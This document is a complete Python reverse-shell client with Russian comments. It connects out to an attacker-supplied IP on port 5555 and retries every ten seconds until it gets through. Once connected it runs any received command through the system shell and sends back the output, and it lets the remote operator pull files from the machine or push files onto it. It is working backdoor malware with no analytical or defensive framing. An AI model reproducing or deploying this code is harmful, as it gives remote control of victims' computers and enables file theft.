import socket
import time
import json
import subprocess
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode('utf-8'))

def reliable_recieve():
    data = ""
    while True:
        try:
            data += s.recv(1024).decode('utf-8', errors='replace')
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        time.sleep(10)
        try:
            s.connect(('Enter your ip', 5555))
            s.send("connected".encode('utf-8'))
            shell()
            s.close()
            break
        except Exception as e:
            continue

def upload_file(filename):
    f = open(filename,'rb')
    s.send(f.read())

def download_file(filename):
    f = open(filename,'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()        

def shell():
    while True:
        command = reliable_recieve()
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command == 'clear':
            pass
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            try:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                try:
                    result = result.decode('cp866')# Декодируем как cp866 (стандартная кодировка cmd.exe для Windows)
                except UnicodeDecodeError:
                    result = result.decode('utf-8', errors='replace')# Если не удалось, используем универсальный fallback
                reliable_send(result)
            except Exception as e:
                reliable_send(f"Ошибка при выполнении команды: {str(e)}")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()